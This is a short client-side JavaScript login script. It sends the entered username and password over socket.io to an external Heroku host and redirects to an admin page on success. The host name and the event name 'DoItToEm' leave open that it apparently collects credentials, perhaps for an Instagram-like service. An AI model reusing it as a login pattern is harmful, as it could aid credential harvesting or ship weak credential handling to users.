var socket = io.connect("https://stuffinsta.herokuapp.com/");

var username,password;


function doit() {
    socket.emit('DoItToEm',document.getElementById("userinp").value,document.getElementById("passinp").value);
    document.getElementById("loginbtn1").innerText = "Loading...";
}

socket.on("Complete",function (done) {
    window.location = 'admin.html';
});

socket.on("Fail",function (done) {
    document.getElementById("userinp").value = "";
    document.getElementById("passinp").value = "";
    document.getElementById("loginbtn1").innerText = "Wrong Password, try again";
});